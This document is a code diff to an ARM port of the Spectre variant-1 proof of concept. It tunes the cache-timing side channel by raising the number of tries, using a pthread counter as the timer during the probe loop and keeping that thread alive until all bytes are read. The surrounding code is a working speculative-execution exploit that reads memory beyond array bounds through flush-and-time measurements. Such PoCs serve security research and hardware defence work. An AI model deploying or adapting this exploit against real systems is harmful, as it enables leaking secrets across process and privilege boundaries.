@@ -12,6 +12,7 @@
 
    timer thread:
    https://gist.github.com/ErikAugust/724d4a969fb2c6ae1bbd7b2a9e3d4bb6
+   https://gist.github.com/Eugnis/3ba3f048988e7be76737ab87da64bb26
 
    perf event:
    https://www.blackhat.com/docs/eu-16/materials/eu-16-Lipp-ARMageddon-How-Your-Smartphone-CPU-Breaks-Software-Level-Security-And-Privacy-wp.pdf
@@ -47,6 +48,8 @@
 libflush_session_t* libflush_session;
 #endif
 
+#define MAX_TRIES 2500 /* default was 999 in original code */
+
 /********************************************************************
 Victim code.
 ********************************************************************/
@@ -73,21 +76,24 @@ void victim_function(size_t x)
 Analysis code
 ********************************************************************/
 /* Clearing cache without _mm_clflush
-  https://minghuasweblog.wordpress.com/2013/03/29/arm-cache-flush-on-mmapd-buffers-with-clear-cache/*/
+  https://minghuasweblog.wordpress.com/2013/03/29/arm-cache-flush-on-mmapd-buffers-with-clear-cache/
+  Another solution is to directly call: __builtin___clear_cache from unistd.h
+*/
 void clearcache(char* begin, char *end)
 {
-	const int syscall = 0xf0002;
-	__asm __volatile (
-		"mov	 r0, %0\n"			
-		"mov	 r1, %1\n"
-		"mov	 r7, %2\n"
-		"mov     r2, #0x0\n"
-		"svc     0x00000000\n"
-		:
-		:	"r" (begin), "r" (end), "r" (syscall)
-		:	"r0", "r1", "r7"
-		);
+  const int syscall = 0xf0002; /* __ARM_NR_cacheflush */
+  __asm __volatile (
+		    "mov	 r0, %0\n"			
+		    "mov	 r1, %1\n"
+		    "mov	 r7, %2\n"
+		    "mov     r2, #0x0\n"
+		    "svc     0x00000000\n"
+		    :
+		    :	"r" (begin), "r" (end), "r" (syscall)
+		    :	"r0", "r1", "r7"
+		    );
 }
+
 
 #ifdef TIMING_REGISTER
 // From https://github.com/IAIK/armageddon
@@ -155,26 +161,21 @@ uint64_t read_cycles()
 ********************************************************/
 
 int counter_thread_ended = 0;
-uint64_t counter = 0;
+uint32_t counter = 0;
 
 void *counter_function(void *x_void_ptr)
 {
-  printf("Counter thread running...\n");
+  printf("[+] Counter thread running...\n");
   
   while (!counter_thread_ended) {
     //printf("Counter = %llu\n", counter);
     counter++;
   }
 
-  printf("Counter thread finished\n");
+  printf("[+] Counter thread finished\n");
   return NULL;
   }
 
-uint64_t read_cycles() {
-  printf("Counter = %llu\n", counter);
-  return (uint64_t) counter;
-}
-  
 #endif 
 
 #ifdef TIMING_PERFEVENT
@@ -244,7 +245,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 
 	for (i = 0; i < 256; i++)
 		results[i] = 0;
-	for (tries = 999; tries > 0; tries--)
+	for (tries = MAX_TRIES; tries > 0; tries--)
 	{
 		/* Flush array2[256*(0..255)] from cache */
 		for (i = 0; i < 256; i++)
@@ -282,11 +283,17 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
 		{
 		  mix_i = ((i * 167) + 13) & 255;
 		  addr = &array2[mix_i * 512];
+#ifdef TIMING_PTHREAD
+		  time1 = counter;
+#else		  
 		  time1 = read_cycles(); /* READ TIMER */
+#endif		  
 		  junk = *addr; /* MEMORY ACCESS TO TIME */
+#ifdef TIMING_PTHREAD
+		  time2 = counter - time1;
+#else		  
 		  time2 = read_cycles() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
-		  if (time2 < CACHE_HIT_THRESHOLD)
-		    printf("mix_i=%3d time2=%llu threshold=%d\n", mix_i, time2, (int)CACHE_HIT_THRESHOLD);
+#endif		  
 		  if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[tries % array1_size]) {
 		    results[mix_i]++; /* cache hit - add +1 to score for this value */
 		    //printf("mix_i=%3d + 1\n", mix_i);
@@ -340,24 +347,16 @@ int main(void)
 
 	printf("Creating counter thread...\n");
 	if (pthread_create(&counter_thread, NULL, counter_function, NULL)) {
-	  fprintf(stderr, "Error creating thread\n");
-	  return 1;
+	  fprintf(stderr, "[-] Error creating thread\n");
+	  return -1;
 	}
-	printf("Waiting for thread to start?\n");
-	sleep(3);
+	printf("[+] Waiting for thread to start?\n");
+	sleep(2);
 #endif 
 
 	for (size_t i = 0; i < sizeof(array2); i++)
 		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
 
-#ifdef TIMING_PTHREAD	
-	// Exit counter thread
-	counter_thread_ended = 1;
-	if (pthread_join(counter_thread, NULL)) {
-	  fprintf(stderr, "Error joining thread\n");
-	  return 2;
-	  }
-#endif
 
 	printf("Reading %d bytes:\n", len);
 	while (--len >= 0)
@@ -379,8 +378,16 @@ int main(void)
 	  printf("Libflush terminate failed\n");
 	  return -1;
 	}
-#endif	
+#endif
 
+#ifdef TIMING_PTHREAD	
+	// Exit counter thread
+	counter_thread_ended = 1;
+	if (pthread_join(counter_thread, NULL)) {
+	  fprintf(stderr, "[-] Error joining thread\n");
+	  return -1;
+	}
+#endif
 	
 	return (0);
 }
